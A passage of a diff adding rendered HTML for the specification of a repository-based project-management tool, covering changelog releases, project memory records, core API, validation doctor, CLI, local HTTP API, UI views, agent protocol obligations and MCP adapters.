+fragments: [CHG-0091, CHG-0092]
+commit: 1a2b3c4
+---
+
+Release notes may contain curated introductory text.</code></pre>
+<p>Release ids are sequential like every other record id, not derived from the
+date: <code>changelog.releasePrefix</code> supplies the prefix and defaults to <code>REL</code>. An
+earlier revision of this example showed <code>REL-2026-07-28</code>, which no release has
+ever been called.</p>
+<h3 id="135-generated-changelog"><a class="hash" href="#135-generated-changelog" aria-hidden="true" tabindex="-1">###</a> 13.5 Generated changelog</h3>
+<p>A generated changelog is output, not canonical input. Manual prose may be preserved through
+explicit managed sections or release records, never by editing generated sections that will
+be overwritten.</p>
+<h3 id="136-card-integration"><a class="hash" href="#136-card-integration" aria-hidden="true" tabindex="-1">###</a> 13.6 Card integration</h3>
+<ul>
+<li>Completing a card does not always require a changelog fragment.</li>
+<li>Public product changes SHOULD reference at least one fragment before becoming <code>done</code> when
+configured policy requires it.</li>
+<li>Changelog fragments MAY reference multiple cards.</li>
+<li>A release can be browsed back to the work, decisions and incidents that produced it.</li>
+</ul>
+<h2 id="14-module-project-memory"><a class="hash" href="#14-module-project-memory" aria-hidden="true" tabindex="-1">##</a> 14. Module: Project memory</h2>
+<h3 id="141-purpose"><a class="hash" href="#141-purpose" aria-hidden="true" tabindex="-1">###</a> 14.1 Purpose</h3>
+<p>Memory stores durable project knowledge that should survive individual conversations and
+agent sessions. It is not a transcript archive.</p>
+<p>A memory record must answer at least one of these questions:</p>
+<ul>
+<li>What did we decide and why?</li>
+<li>What did we learn that changes future work?</li>
+<li>What failed and how do we prevent recurrence?</li>
+<li>What convention must future contributors follow?</li>
+<li>What temporary context matters until a known expiry point?</li>
+</ul>
+<h3 id="142-memory-collections"><a class="hash" href="#142-memory-collections" aria-hidden="true" tabindex="-1">###</a> 14.2 Memory collections</h3>
+<h4 id="learnings"><a class="hash" href="#learnings" aria-hidden="true" tabindex="-1">####</a> Learnings</h4>
+<p>Reusable observations supported by experience.</p>
+<pre class="code" data-lang="yaml"><code>---
+id: LRN-0017
+title: Avoid serializing lazy proxies in audit diffs
+category: backend
+status: active
+confidence: high
+occurrences: 3
+related: [T-0042, INC-0004]
+created: 2026-07-20
+updated: 2026-07-28
+---
+
+Describe the observed pattern, evidence and preferred response.</code></pre>
+<p>Statuses: <code>active</code>, <code>graduated</code>, <code>superseded</code>, <code>discarded</code>.</p>
+<p>A graduated learning has been converted into a convention, automated check, documentation or
+code invariant.</p>
+<h4 id="decisions"><a class="hash" href="#decisions" aria-hidden="true" tabindex="-1">####</a> Decisions</h4>
+<p>Architecture and product decisions, compatible with ADR practice.</p>
+<pre class="code" data-lang="yaml"><code>---
+id: ADR-0008
+title: Keep protocol data in repository Markdown
+status: accepted
+deciders: [owner]
+supersedes: []
+related: [DOC-0012]
+created: 2026-07-28
+updated: 2026-07-28
+---
+
+## Context
+
+## Decision
+
+## Consequences</code></pre>
+<p>Statuses: <code>proposed</code>, <code>accepted</code>, <code>rejected</code>, <code>superseded</code>.</p>
+<h4 id="incidents"><a class="hash" href="#incidents" aria-hidden="true" tabindex="-1">####</a> Incidents</h4>
+<p>Operational failures and their prevention.</p>
+<pre class="code" data-lang="yaml"><code>---
+id: INC-0004
+title: Deployment marked complete before migrations shipped
+severity: high
+status: resolved
+started_at: 2026-07-26T11:04:00Z
+resolved_at: 2026-07-26T14:18:00Z
+related: [T-1533, T-1561, LRN-0017]
+created: 2026-07-26
+updated: 2026-07-28
+---
+
+## Impact
+
+## Timeline
+
+## Root cause
+
+## Corrective actions</code></pre>
+<p>Statuses: <code>open</code>, <code>mitigated</code>, <code>resolved</code>, <code>closed</code>.</p>
+<h4 id="conventions"><a class="hash" href="#conventions" aria-hidden="true" tabindex="-1">####</a> Conventions</h4>
+<p>Stable rules contributors and agents must follow.</p>
+<pre class="code" data-lang="yaml"><code>---
+id: CONV-0006
+title: Verify user-visible changes before closing cards
+status: active
+scope: [project-wide]
+related: [INC-0004]
+created: 2026-07-28
+updated: 2026-07-28
+---
+
+A user-visible card remains in review until verified in a running environment.</code></pre>
+<p>Statuses: <code>draft</code>, <code>active</code>, <code>deprecated</code>, <code>superseded</code>.</p>
+<h4 id="context"><a class="hash" href="#context" aria-hidden="true" tabindex="-1">####</a> Context</h4>
+<p>Temporary project facts with explicit expiry or review.</p>
+<pre class="code" data-lang="yaml"><code>---
+id: CTX-0011
+title: Billing migration freeze window
+status: active
+expires: 2026-08-15
+related: [T-0042]
+created: 2026-07-28
+updated: 2026-07-28
+---
+
+Describe the temporary constraint and what should happen at expiry.</code></pre>
+<p>Statuses: <code>active</code>, <code>expired</code>, <code>resolved</code>.</p>
+<p>Context records SHOULD include <code>expires</code> or <code>review_after</code>. The doctor warns about expired
+active context.</p>
+<h3 id="143-memory-quality-rules"><a class="hash" href="#143-memory-quality-rules" aria-hidden="true" tabindex="-1">###</a> 14.3 Memory quality rules</h3>
+<p>Memory MUST NOT become a dumping ground for conversation summaries.</p>
+<p>A valid memory record SHOULD:</p>
+<ul>
+<li>contain a stable title and a specific claim;</li>
+<li>explain evidence or rationale;</li>
+<li>link to related records or sources;</li>
+<li>state consequences or future behavior;</li>
+<li>be updated or superseded when invalidated;</li>
+<li>avoid credentials, personal secrets and unnecessary sensitive data.</li>
+</ul>
+<h3 id="144-graduation"><a class="hash" href="#144-graduation" aria-hidden="true" tabindex="-1">###</a> 14.4 Graduation</h3>
+<p>Learnings and incidents should produce stronger artifacts when appropriate:</p>
+<pre class="code" data-lang="text"><code>observation → learning → convention / test / runbook / decision
+incident → corrective cards → learning → convention</code></pre>
+<p>The UI SHOULD show graduation links and unresolved corrective actions.</p>
+<h2 id="15-sources-and-traceability"><a class="hash" href="#15-sources-and-traceability" aria-hidden="true" tabindex="-1">##</a> 15. Sources and traceability</h2>
+<p>Long-form raw inputs MAY be stored under <code>.project/sources/</code> and linked by records.</p>
+<p>Examples:</p>
+<ul>
+<li>audits;</li>
+<li>research dumps;</li>
+<li>imported issue reports;</li>
+<li>migration inventories;</li>
+<li>handoffs;</li>
+<li>external-system exports.</li>
+</ul>
+<p>Rules:</p>
+<ul>
+<li>sources are snapshots and SHOULD not be rewritten to reflect later execution state;</li>
+<li>operational state belongs in cards and related records;</li>
+<li>a source may be marked exhausted after all actionable content is represented elsewhere;</li>
+<li>source paths are repository-relative;</li>
+<li>the doctor verifies referenced local paths;</li>
+<li>imported sources MAY store origin metadata such as URL or external issue ID.</li>
+</ul>
+<h2 id="16-core-architecture"><a class="hash" href="#16-core-architecture" aria-hidden="true" tabindex="-1">##</a> 16. Core architecture</h2>
+<h3 id="161-layers"><a class="hash" href="#161-layers" aria-hidden="true" tabindex="-1">###</a> 16.1 Layers</h3>
+<pre class="code" data-lang="text"><code>Configuration and schemas
+          ↓
+Workspace and filesystem adapters
+          ↓
+Module repositories and domain services
+          ↓
+Validation, indexing and relationship graph
+          ↓
+CLI / HTTP API / MCP adapters
+          ↓
+Local UI and generated agent instructions</code></pre>
+<p>Dependencies point downward only. The UI MUST NOT contain canonical business rules that the
+core does not enforce.</p>
+<h3 id="162-public-core-api"><a class="hash" href="#162-public-core-api" aria-hidden="true" tabindex="-1">###</a> 16.2 Public core API</h3>
+<p>The package exposes a documented programmatic API. Every name below is resolved
+against the built package by &quot;no doc imports a name the package does not
+export&quot; in <code>test/documentation.test.ts</code>, so this block cannot drift from what
+ships without failing the suite.</p>
+<pre class="code" data-lang="ts"><code>export {
+    defineProject,
+    loadWorkspace,
+    initializeProject,
+    applyLegacyMigration,
+    buildProjectIndex,
+    runDoctor
+} from &quot;@illodev/workfile&quot;;
+
+export type {
+    ProjectConfig,
+    ProjectWorkspace,
+    ProjectRecord,
+    CardRecord,
+    DocumentRecord,
+    ChangeRecord,
+    MemoryRecord,
+    DoctorReport
+} from &quot;@illodev/workfile&quot;;</code></pre>
+<p>Module operations are free functions taking a workspace, not repositories
+hanging off one. <code>ProjectWorkspace</code> carries the configuration, the resolved
+paths, the effective schema and the declared integrations — it exposes no
+methods, and a caller reaches every operation through the functions below
+rather than through a raw file write:</p>
+<pre class="code" data-lang="ts"><code>const { cards } = await loadCards(workspace);
+await createCard(workspace, input);
+await patchCard(workspace, id, changes, { actor });
+await claimCard(workspace, id, { actor, scope });
+await transitionCard(workspace, id, status, { actor });
+const { documents } = await loadDocuments(workspace);
+await createChangeFragment(workspace, input);
+await createMemoryRecord(workspace, collection, input);
+searchProjectRecords(records, query, { kinds, limit });</code></pre>
+<p><code>searchProjectRecords</code> takes records rather than a workspace because ranking is
+pure: the caller decides what corpus is eligible, which is what lets the CLI,
+the HTTP API and MCP share one ranking over different candidate sets.</p>
+<p>Subpath exports group the same functions by module — <code>@illodev/workfile/cards</code>,
+<code>/docs</code>, <code>/changelog</code>, <code>/memory</code>, <code>/records</code>, <code>/search</code>, <code>/agents</code>, <code>/ci</code>,
+<code>/core</code>, <code>/server</code>, <code>/mcp</code>, <code>/init</code>, <code>/migration</code>, <code>/claude</code>,
+<code>/integrations</code> — and the root re-exports all of them.</p>
+<h3 id="163-filesystem-adapter"><a class="hash" href="#163-filesystem-adapter" aria-hidden="true" tabindex="-1">###</a> 16.3 Filesystem adapter</h3>
+<p>All canonical writes MUST:</p>
+<ol>
+<li>resolve and validate paths inside the workspace;</li>
+<li>read the latest on-disk version;</li>
+<li>validate the intended mutation;</li>
+<li>write to a temporary file in the same filesystem;</li>
+<li>atomically rename into place where supported;</li>
+<li>preserve the body and unknown compatible fields;</li>
+<li>update semantic timestamps;</li>
+<li>invalidate affected indexes;</li>
+<li>return the normalized saved record.</li>
+</ol>
+<p>Direct <code>writeFile</code> calls outside the filesystem adapter are forbidden in protocol modules.</p>
+<h3 id="164-optimistic-concurrency"><a class="hash" href="#164-optimistic-concurrency" aria-hidden="true" tabindex="-1">###</a> 16.4 Optimistic concurrency</h3>
+<p>Mutation APIs SHOULD accept a revision token derived from file content or metadata:</p>
+<pre class="code" data-lang="ts"><code>interface MutationOptions {
+    expectedRevision?: string;
+}</code></pre>
+<p>If the file changed after the client loaded it, the mutation returns a conflict rather than
+silently overwriting another human or agent.</p>
+<h3 id="165-unknown-fields"><a class="hash" href="#165-unknown-fields" aria-hidden="true" tabindex="-1">###</a> 16.5 Unknown fields</h3>
+<p>The parser MUST preserve unknown frontmatter fields during edits unless they are invalid or
+belong to an unsupported future schema version. This permits compatible extensions and safe
+round trips.</p>
+<h2 id="17-derived-index-and-search"><a class="hash" href="#17-derived-index-and-search" aria-hidden="true" tabindex="-1">##</a> 17. Derived index and search</h2>
+<h3 id="171-cache"><a class="hash" href="#171-cache" aria-hidden="true" tabindex="-1">###</a> 17.1 Cache</h3>
+<p>The default derived index is stored at:</p>
+<pre class="code" data-lang="text"><code>.project/.cache/index.sqlite</code></pre>
+<p>The exact engine is an implementation detail. It MAY initially be an in-memory index with a
+JSON cache, provided the public behavior is stable.</p>
+<h3 id="172-indexed-data"><a class="hash" href="#172-indexed-data" aria-hidden="true" tabindex="-1">###</a> 17.2 Indexed data</h3>
+<p>The index may contain:</p>
+<ul>
+<li>normalized record metadata;</li>
+<li>full-text document content;</li>
+<li>outgoing and incoming references;</li>
+<li>hierarchy and dependency edges;</li>
+<li>source paths;</li>
+<li>file fingerprints;</li>
+<li>validation summaries;</li>
+<li>optional embeddings.</li>
+</ul>
+<h3 id="173-rebuildability"><a class="hash" href="#173-rebuildability" aria-hidden="true" tabindex="-1">###</a> 17.3 Rebuildability</h3>
+<p>Deleting <code>.project/.cache/</code> MUST NOT lose canonical data. <code>workfile doctor --rebuild-cache</code>
+recreates it from repository files.</p>
+<h3 id="174-search-syntax"><a class="hash" href="#174-search-syntax" aria-hidden="true" tabindex="-1">###</a> 17.4 Search syntax</h3>
+<p>A common query language should serve CLI and UI:</p>
+<pre class="code" data-lang="text"><code>payment retry
+area:billing status:doing
+kind:decision tag:architecture
+related:T-0042
+path:docs/fiscal
+-type:idea
+&quot;exact phrase&quot;</code></pre>
+<p>Unknown field tokens should produce a helpful warning rather than being silently interpreted
+as free text.</p>
+<h3 id="175-semantic-search"><a class="hash" href="#175-semantic-search" aria-hidden="true" tabindex="-1">###</a> 17.5 Semantic search</h3>
+<p>Semantic search is optional and disabled by default. When enabled:</p>
+<ul>
+<li>embeddings are derived state;</li>
+<li>the provider and data boundary are explicit;</li>
+<li>local providers are supported where practical;</li>
+<li>repository content is never sent externally without user configuration;</li>
+<li>results always link back to canonical files.</li>
+</ul>
+<h2 id="18-validation-and-workfile-doctor"><a class="hash" href="#18-validation-and-workfile-doctor" aria-hidden="true" tabindex="-1">##</a> 18. Validation and workfile doctor</h2>
+<h3 id="181-command"><a class="hash" href="#181-command" aria-hidden="true" tabindex="-1">###</a> 18.1 Command</h3>
+<pre class="code" data-lang="bash"><code>workfile doctor
+workfile doctor --json
+workfile doctor --severity error
+workfile doctor --new
+workfile doctor --accept-baseline
+workfile doctor --fix</code></pre>
+<p><code>--fix</code> only applies deterministic, reversible fixes. It MUST show a plan unless <code>--yes</code> is
+provided.</p>
+<h3 id="182-severity"><a class="hash" href="#182-severity" aria-hidden="true" tabindex="-1">###</a> 18.2 Severity</h3>
+<ul>
+<li><code>error</code> — invalid canonical state or unsafe operation; non-zero exit.</li>
+<li><code>warning</code> — likely inconsistency or stale state; configurable CI behavior.</li>
+<li><code>info</code> — recommendation or maintenance opportunity.</li>
+</ul>
+<h3 id="183-cross-module-checks"><a class="hash" href="#183-cross-module-checks" aria-hidden="true" tabindex="-1">###</a> 18.3 Cross-module checks</h3>
+<p>The doctor validates at least:</p>
+<ul>
+<li>configuration and schema version;</li>
+<li>required fields and enums;</li>
+<li>IDs, filenames and duplicate identity;</li>
+<li>parser round-trip stability;</li>
+<li>hierarchy depth and cycles;</li>
+<li>broken strict references;</li>
+<li>missing source paths;</li>
+<li>date and range validity;</li>
+<li>claim coherence and stale claims;</li>
+<li>overlapping active scopes;</li>
+<li>archived record eligibility;</li>
+<li>unchecked acceptance criteria on completed cards;</li>
+<li>card-declared commands outside the project&#39;s allowlist, which is the only
+check a card arriving as a file in a diff ever meets;</li>
+<li>a completed card verified by a method its area no longer accepts, and a
+verification policy naming an area the project no longer declares;</li>
+<li>expired active context;</li>
+<li>superseded records still marked active;</li>
+<li>missing release fragments where required by policy;</li>
+<li>stale managed documentation heuristics;</li>
+<li>orphaned asset directories;</li>
+<li>generated agent instructions out of sync;</li>
+<li>frontmatter keys whose shape the codec cannot rewrite, on any kind of record, so that
+a header a write would be refused on is found by looking rather than by the refusal;</li>
+<li>uncommitted schema migrations where detectable.</li>
+</ul>
+<p>Duplicate identity has a repair contract, because sequential IDs are allocated by scanning
+the local maximum and two clones therefore mint the same one independently. Filenames carry
+a title slug, so both files merge without a conflict and the collision surfaces only in the
+doctor.</p>
+<ul>
+<li>A duplicate is healed by moving the losing record to a free ID in its own sequence. The
+surviving record keeps the ID and keeps every reference already written to it.</li>
+<li>The survivor MUST be chosen deterministically, so two clones repairing the same collision
+converge without coordinating. Comparisons MUST order by code unit rather than by locale.</li>
+<li>A record that has been published MUST NOT move. A released changelog fragment is frozen
+when its release is cut, and renumbering it would rewrite history that has shipped.</li>
+<li>A collision the tool declines to heal MUST be reported with the reason it declined, and
+MUST NOT name a command that cannot perform the repair.</li>
+</ul>
+<h3 id="184-baseline-mode"><a class="hash" href="#184-baseline-mode" aria-hidden="true" tabindex="-1">###</a> 18.4 Baseline mode</h3>
+<p><code>--accept-baseline</code> records the current issues as known, and <code>--new</code> then exits non-zero only
+on issues that appeared since. This is the adoption path for an existing repository and the
+recommended CI gate.</p>
+<p>A per-diff mode was specified here for a long time and never built. It is not planned: rule
+evaluation is 3–5% of the command&#39;s cost at every measured scale — the rest is reading the
+corpus, which a scoped run cannot skip and which is cold in CI regardless, since the cache
+directory is not committed. Several rules are also global by nature (a stale claim, an expired
+context, a duplicate id), so a run scoped to touched records would report them only after the
+merge that made them matter.</p>
+<h3 id="185-rule-registry"><a class="hash" href="#185-rule-registry" aria-hidden="true" tabindex="-1">###</a> 18.5 Rule registry</h3>
+<p>Rules implement a shared interface:</p>
+<pre class="code" data-lang="ts"><code>interface DoctorRule {
+    id: string;
+    modules: string[];
+    run(context: DoctorContext): Promise&lt;DoctorIssue[]&gt;;
+    fix?: (issue: DoctorIssue, context: FixContext) =&gt; Promise&lt;FixResult&gt;;
+}</code></pre>
+<p>Project-specific rules use namespaced IDs.</p>
+<h2 id="19-cli"><a class="hash" href="#19-cli" aria-hidden="true" tabindex="-1">##</a> 19. CLI</h2>
+<h3 id="191-entry-points"><a class="hash" href="#191-entry-points" aria-hidden="true" tabindex="-1">###</a> 19.1 Entry points</h3>
+<pre class="code" data-lang="bash"><code>workfile init
+workfile schema
+workfile doctor
+workfile upgrade
+workfile version
+workfile ui
+workfile card
+workfile doc
+workfile changelog
+workfile memory
+workfile agents
+workfile ci
+workfile claude
+workfile migrate
+workfile mcp
+workfile search</code></pre>
+<p>Running <code>workfile</code> with no subcommand starts the UI. Nothing in configuration
+disables that: the command word defaults to <code>ui</code> before any config is read.</p>
+<h3 id="192-initialization"><a class="hash" href="#192-initialization" aria-hidden="true" tabindex="-1">###</a> 19.2 Initialization</h3>
+<pre class="code" data-lang="bash"><code>pnpm dlx @illodev/workfile init</code></pre>
+<p>The initializer:</p>
+<ol>
+<li>discovers the repository and package manager;</li>
+<li>detects monorepo workspaces and likely areas;</li>
+<li>finds existing documentation paths;</li>
+<li>asks which modules to enable;</li>
+<li>asks which agent environments are used;</li>
+<li>proposes paths and previews changes;</li>
+<li>creates configuration and protocol directories;</li>
+<li>writes <code>.project/VERSION</code>;</li>
+<li>updates <code>.gitignore</code> for cache only;</li>
+<li>optionally adds package scripts;</li>
+<li>optionally imports an existing v1 backlog;</li>
+<li>runs the doctor and prints next steps.</li>
+</ol>
+<p>It MUST NOT overwrite existing files without confirmation or an explicit merge strategy.</p>
+<h3 id="193-suggested-package-scripts"><a class="hash" href="#193-suggested-package-scripts" aria-hidden="true" tabindex="-1">###</a> 19.3 Suggested package scripts</h3>
+<pre class="code" data-lang="json"><code>{
+    &quot;scripts&quot;: {
+        &quot;project&quot;: &quot;workfile ui&quot;,
+        &quot;project:doctor&quot;: &quot;workfile doctor&quot;,
+        &quot;project:agents&quot;: &quot;workfile agents sync&quot;
+    }
+}</code></pre>
+<p>The package manager prefix is detected; the protocol itself does not require these aliases.</p>
+<h3 id="194-card-commands"><a class="hash" href="#194-card-commands" aria-hidden="true" tabindex="-1">###</a> 19.4 Card commands</h3>
+<pre class="code" data-lang="bash"><code>workfile card list
+workfile card show T-0042
+workfile card create
+workfile card patch T-0042 --json-input changes.json
+workfile card claim T-0042 --scope apps/api
+workfile card release T-0042
+workfile card transition T-0042 review
+workfile card archive T-0042
+workfile card reopen T-0042</code></pre>
+<p>Machine-oriented usage supports JSON input and output:</p>
+<pre class="code" data-lang="bash"><code>workfile card create --json-input card.json --json</code></pre>
+<h3 id="195-documentation-commands"><a class="hash" href="#195-documentation-commands" aria-hidden="true" tabindex="-1">###</a> 19.5 Documentation commands</h3>
+<pre class="code" data-lang="bash"><code>workfile docs list
+workfile docs create --kind architecture
+workfile docs show DOC-0012
+workfile search &quot;billing retry&quot; --kind doc</code></pre>
+<h3 id="196-changelog-commands"><a class="hash" href="#196-changelog-commands" aria-hidden="true" tabindex="-1">###</a> 19.6 Changelog commands</h3>
+<pre class="code" data-lang="bash"><code>workfile changelog add
+workfile changelog list --unreleased
+workfile changelog release 2.4.0
+workfile changelog render
+workfile changelog verify</code></pre>
+<h3 id="197-memory-commands"><a class="hash" href="#197-memory-commands" aria-hidden="true" tabindex="-1">###</a> 19.7 Memory commands</h3>
+<pre class="code" data-lang="bash"><code>workfile memory add learning
+workfile memory add decision
+workfile memory add incident
+workfile memory add convention
+workfile memory add context
+workfile memory list --query &quot;deployment verification&quot;
+workfile memory supersede ADR-0008
+workfile memory graduate LRN-0017 --to CONV-0001</code></pre>
+<h3 id="198-exit-codes"><a class="hash" href="#198-exit-codes" aria-hidden="true" tabindex="-1">###</a> 19.8 Exit codes</h3>
+<ul>
+<li><code>0</code> success;</li>
+<li><code>1</code> validation or expected command failure;</li>
+<li><code>2</code> invalid usage or configuration;</li>
+<li><code>3</code> write conflict;</li>
+<li><code>4</code> migration required;</li>
+<li>other codes reserved for documented fatal errors.</li>
+</ul>
+<h2 id="20-local-server-and-http-api"><a class="hash" href="#20-local-server-and-http-api" aria-hidden="true" tabindex="-1">##</a> 20. Local server and HTTP API</h2>
+<h3 id="201-server-behavior"><a class="hash" href="#201-server-behavior" aria-hidden="true" tabindex="-1">###</a> 20.1 Server behavior</h3>
+<pre class="code" data-lang="bash"><code>workfile ui</code></pre>
+<ul>
+<li>serves the precompiled UI and JSON API from one local process;</li>
+<li>binds to <code>127.0.0.1</code> by default;</li>
+<li>selects configured port or a free alternative when allowed;</li>
+<li>prints the workspace and URL;</li>
+<li>may open the browser;</li>
+<li>watches canonical files and updates clients;</li>
+<li>never assumes the package is located inside the project tree.</li>
+</ul>
+<h3 id="202-api-shape"><a class="hash" href="#202-api-shape" aria-hidden="true" tabindex="-1">###</a> 20.2 API shape</h3>
+<p>Versioned endpoints use <code>/api/v2</code>:</p>
+<pre class="code" data-lang="text"><code>GET    /api/v2/workspace
+GET    /api/v2/schema
+GET    /api/v2/records
+GET    /api/v2/records/:id
+POST   /api/v2/cards
+PATCH  /api/v2/cards/:id
+POST   /api/v2/cards/:id/claim
+POST   /api/v2/cards/:id/transition
+POST   /api/v2/cards/bulk
+GET    /api/v2/docs
+GET    /api/v2/changelog
+GET    /api/v2/memory
+GET    /api/v2/search
+GET    /api/v2/health
+POST   /api/v2/index/rebuild</code></pre>
+<p>Module-specific routes may supplement the common record API.</p>
+<h3 id="203-schema-endpoint"><a class="hash" href="#203-schema-endpoint" aria-hidden="true" tabindex="-1">###</a> 20.3 Schema endpoint</h3>
+<p>The UI MUST obtain effective vocabularies and module capabilities at runtime:</p>
+<pre class="code" data-lang="json"><code>{
+    &quot;schemaVersion&quot;: 2,
+    &quot;modules&quot;: {
+        &quot;cards&quot;: true,
+        &quot;docs&quot;: true,
+        &quot;changelog&quot;: true,
+        &quot;memory&quot;: true
+    },
+    &quot;cards&quot;: {
+        &quot;statuses&quot;: [&quot;backlog&quot;, &quot;next&quot;, &quot;doing&quot;, &quot;review&quot;, &quot;blocked&quot;, &quot;deferred&quot;, &quot;done&quot;, &quot;discarded&quot;],
+        &quot;types&quot;: [&quot;epic&quot;, &quot;idea&quot;, &quot;feature&quot;, &quot;bug&quot;, &quot;task&quot;, &quot;audit&quot;, &quot;docs&quot;, &quot;chore&quot;],
+        &quot;priorities&quot;: [&quot;critical&quot;, &quot;high&quot;, &quot;medium&quot;, &quot;low&quot;],
+        &quot;areas&quot;: [&quot;api&quot;, &quot;web&quot;, &quot;infra&quot;, &quot;docs&quot;]
+    }
+}</code></pre>
+<p>The UI MUST NOT compile project-specific areas or collections into its TypeScript bundle.</p>
+<h3 id="204-api-errors"><a class="hash" href="#204-api-errors" aria-hidden="true" tabindex="-1">###</a> 20.4 API errors</h3>
+<p>Errors use a stable structure:</p>
+<pre class="code" data-lang="json"><code>{
+    &quot;error&quot;: {
+        &quot;code&quot;: &quot;CARD_WRITE_CONFLICT&quot;,
+        &quot;message&quot;: &quot;The card changed after it was loaded.&quot;,
+        &quot;details&quot;: {}
+    }
+}</code></pre>
+<h2 id="21-user-interface"><a class="hash" href="#21-user-interface" aria-hidden="true" tabindex="-1">##</a> 21. User interface</h2>
+<h3 id="211-information-architecture"><a class="hash" href="#211-information-architecture" aria-hidden="true" tabindex="-1">###</a> 21.1 Information architecture</h3>
+<p>The primary navigation groups the product by user intent:</p>
+<pre class="code" data-lang="text"><code>Work
+├── Explorer
+├── Triage
+├── Flow
+├── Epics
+└── Timeline
+
+Knowledge
+├── Docs
+├── Memory
+└── Search
+
+History
+├── Changelog
+└── Releases
+
+System
+└── Health</code></pre>
+<p>Exact visual navigation may use tabs, sidebar or command palette, but these concepts remain
+separate.</p>
+<h3 id="212-shared-behaviors"><a class="hash" href="#212-shared-behaviors" aria-hidden="true" tabindex="-1">###</a> 21.2 Shared behaviors</h3>
+<ul>
+<li>global search across enabled modules;</li>
+<li>bookmarkable URL state;</li>
+<li>light and dark themes;</li>
+<li>keyboard navigation;</li>
+<li>accessible drawers and dialogs;</li>
+<li>local editor deep links;</li>
+<li>relationship and backlink panels;</li>
+<li>optimistic updates with conflict recovery;</li>
+<li>file-change refresh without erasing unsaved edits;</li>
+<li>clear read-only versus editable state;</li>
+<li>useful empty states when a module is disabled or uninitialized.</li>
+</ul>
+<h3 id="213-work-views"><a class="hash" href="#213-work-views" aria-hidden="true" tabindex="-1">###</a> 21.3 Work views</h3>
+<p>The existing concepts remain:</p>
+<ul>
+<li>Explorer: virtualized table, facets, sorting and bulk mutation;</li>
+<li>Triage: one-card prioritization queue with keyboard shortcuts;</li>
+<li>Flow: execution board with drag-and-drop transitions;</li>
+<li>Epics: hierarchy and child progress;</li>
+<li>Timeline: optional scheduling view;</li>
+<li>card drawer: metadata, Markdown body, relationships and assets.</li>
+</ul>
+<h3 id="214-docs-view"><a class="hash" href="#214-docs-view" aria-hidden="true" tabindex="-1">###</a> 21.4 Docs view</h3>
+<p>The Docs view provides:</p>
+<ul>
+<li>source/collection tree;</li>
+<li>full-text search;</li>
+<li>Markdown rendering;</li>
+<li>metadata and freshness status;</li>
+<li>incoming and outgoing links;</li>
+<li>related work and decisions;</li>
+<li>open-in-editor action;</li>
+<li>optional managed-document editing after MVP.</li>
+</ul>
+<h3 id="215-changelog-view"><a class="hash" href="#215-changelog-view" aria-hidden="true" tabindex="-1">###</a> 21.5 Changelog view</h3>
+<p>The History view provides:</p>
+<ul>
+<li>unreleased fragments;</li>
+<li>release groups;</li>
+<li>public/internal visibility filters;</li>
+<li>linked cards and decisions;</li>
+<li>release preparation preview;</li>
+<li>rendered output preview;</li>
+<li>validation before release.</li>
+</ul>
+<h3 id="216-memory-view"><a class="hash" href="#216-memory-view" aria-hidden="true" tabindex="-1">###</a> 21.6 Memory view</h3>
+<p>The Memory view provides:</p>
+<ul>
+<li>collection filters;</li>
+<li>active/superseded/expired states;</li>
+<li>relationship graph or backlinks;</li>
+<li>learning occurrence and confidence metadata;</li>
+<li>decision chains;</li>
+<li>incident corrective actions;</li>
+<li>graduation and supersession actions.</li>
+</ul>
+<h3 id="217-health-view"><a class="hash" href="#217-health-view" aria-hidden="true" tabindex="-1">###</a> 21.7 Health view</h3>
+<p>Health renders the exact doctor report, supports severity filtering and links issues to their
+records and files. It MUST not implement a separate set of validation rules.</p>
+<h2 id="22-agent-protocol"><a class="hash" href="#22-agent-protocol" aria-hidden="true" tabindex="-1">##</a> 22. Agent protocol</h2>
+<h3 id="221-canonical-instructions"><a class="hash" href="#221-canonical-instructions" aria-hidden="true" tabindex="-1">###</a> 22.1 Canonical instructions</h3>
+<p>The source instruction set lives under:</p>
+<pre class="code" data-lang="text"><code>.project/agents/protocol.md
+.project/agents/workflows/*.md</code></pre>
+<p>Adapters generate concise compatible instructions for:</p>
+<pre class="code" data-lang="text"><code>AGENTS.md
+CLAUDE.md
+.cursor/rules/workfile.mdc
+.github/copilot-instructions.md</code></pre>
+<p>Generated blocks include a version marker and MUST be replaceable without overwriting
+unrelated user content.</p>
+<h3 id="222-core-obligations"><a class="hash" href="#222-core-obligations" aria-hidden="true" tabindex="-1">###</a> 22.2 Core obligations</h3>
+<p>A protocol-aware agent MUST:</p>
+<ol>
+<li>inspect relevant project records before beginning substantial work;</li>
+<li>create cards in the same session when actionable pending work is discovered;</li>
+<li>claim a card before modifying its scope;</li>
+<li>check active claims and overlapping scopes;</li>
+<li>keep the card updated while working;</li>
+<li>clear claims when active work stops;</li>
+<li>use <code>review</code> until verification supports <code>done</code>;</li>
+<li>record durable decisions, incidents or learnings when they change future behavior;</li>
+<li>add changelog fragments when project policy requires them;</li>
+<li>never place credentials or unnecessary sensitive information in workfile memory;</li>
+<li>run relevant doctor checks before finishing;</li>
+<li>prefer CLI or MCP mutations over hand-written frontmatter.</li>
+</ol>
+<h3 id="223-agent-context-budget"><a class="hash" href="#223-agent-context-budget" aria-hidden="true" tabindex="-1">###</a> 22.3 Agent context budget</h3>
+<p>Agents SHOULD load the smallest relevant context:</p>
+<ul>
+<li>one card and its relationship neighborhood;</li>
+<li>scoped docs and decisions;</li>
+<li>active conventions;</li>
+<li>unresolved incidents relevant to the paths;</li>
+<li>non-expired context.</li>
+</ul>
+<p>The protocol MUST not encourage injecting the entire workfile memory into every prompt.</p>
+<h3 id="224-instruction-synchronization"><a class="hash" href="#224-instruction-synchronization" aria-hidden="true" tabindex="-1">###</a> 22.4 Instruction synchronization</h3>
+<pre class="code" data-lang="bash"><code>workfile agents sync
+workfile agents check</code></pre>
+<p><code>sync</code> regenerates managed instruction blocks. <code>check</code> fails when generated blocks are stale
+relative to the installed protocol version or project configuration.</p>
+<h2 id="23-mcp-and-tool-adapters"><a class="hash" href="#23-mcp-and-tool-adapters" aria-hidden="true" tabindex="-1">##</a> 23. MCP and tool adapters</h2>
+<p>MCP is an adapter over core services, not a second implementation.</p>
+<p>The tool catalogue is <strong>not restated here</strong>. <code>docs/mcp.md</code> documents every
+shipped tool with its parameters and reply shape, and <code>workfile mcp inspect</code>
+prints the same list from the definitions the server answers <code>tools/list</code> with.
+An earlier revision of this section listed fourteen recommended tools in a
+verb-first naming scheme. The server shipped noun-first in 0.1.0 and grew past
+it, so from the first release until this was corrected the normative document
+named thirteen tools no client could call. A second copy of a catalogue is only
+right until one of them moves.</p>
+<p>Tools are named <code>project_&lt;module&gt;_&lt;operation&gt;</code> — the module first, so a client
